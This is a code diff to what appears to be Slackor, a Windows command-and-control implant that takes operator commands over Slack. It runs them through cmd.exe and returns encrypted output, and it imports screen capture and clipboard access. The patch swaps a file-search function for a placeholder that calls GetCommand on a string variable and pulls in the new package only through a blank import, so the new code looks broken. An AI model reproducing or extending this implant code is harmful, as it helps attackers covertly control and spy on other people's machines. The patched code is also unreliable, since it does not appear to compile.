@@ -28,8 +28,9 @@ import (
 	"time"
 	"unsafe"
 
+	_ "github.com/Coalfire-Research/Slackor/pkg/common"
+
 	"github.com/atotto/clipboard"
-	"github.com/bmatcuk/doublestar"
 	"github.com/kbinani/screenshot"
 	"github.com/miekg/dns"
 	"golang.org/x/sys/windows"
@@ -1093,35 +1094,6 @@ func ls(location string) string { // Lists the files in the given directory
 	return result
 }
 
-func find(glob string) string { // Searches the current directory for the glob
-	filenames, err := doublestar.Glob(glob)
-	if err != nil {
-		return "Invalid glob pattern."
-	}
-	var result string
-	if len(filenames) > 0 {
-		for _, filename := range filenames {
-			f, err := os.Stat(filename)
-			if err != nil {
-				// If we can't stat the file for some reason, don't prevent other results from being returned
-				result = result + spacePad("n/a", "ts") + "   <ERR>    " + spacePad("n/a", "size") + "     " + filename + "\n"
-				continue
-			}
-			size := ByteCountDecimal(f.Size())
-			timestamp := f.ModTime()
-			ts := timestamp.Format("01/02/2006 3:04:05 PM MST")
-			dir := "            "
-			if f.IsDir() {
-				dir = "   <DIR>    "
-			}
-			result = result + spacePad(ts, "ts") + dir + spacePad(size, "size") + "     " + filename + "\n"
-		}
-	} else {
-		return "No matches."
-	}
-	return result
-}
-
 func deleteFile(path string) string { // Deletes a file
 
 	var err = os.Remove(path)
@@ -1841,6 +1813,7 @@ func CheckCommands(t, client_ID string) { //This is the main thing, reads the co
 }
 
 func RunCommand(client_id, job_id, command string) { //This receives a command to run and runs it
+	var err error
 	cmdName := "cmd.exe"
 	cmd := exec.Command(cmdName)
 	//Check if the command has multiple params
@@ -1862,8 +1835,19 @@ func RunCommand(client_id, job_id, command string) { //This receives a command t
 			SendResult(client_id, job_id, "output", encryptedOutput)
 
 		case "find":
-			find := find(args[1])
-			encryptedOutput, _ := Encrypt([]byte(find))
+			// TODO: Placeholder to verify command interface works
+			findCmd := command.GetCommand(args[0])
+			cmdArgs := args[1:]
+			var result string
+			if findCmd != nil {
+				result, err = findCmd.Run(cmdArgs)
+				if err != nil {
+					result = err.Error()
+				}
+			} else {
+				result = "find command unavailable"
+			}
+			encryptedOutput, _ := Encrypt([]byte(result))
 			SendResult(client_id, job_id, "output", encryptedOutput)
 
 		case "rm":
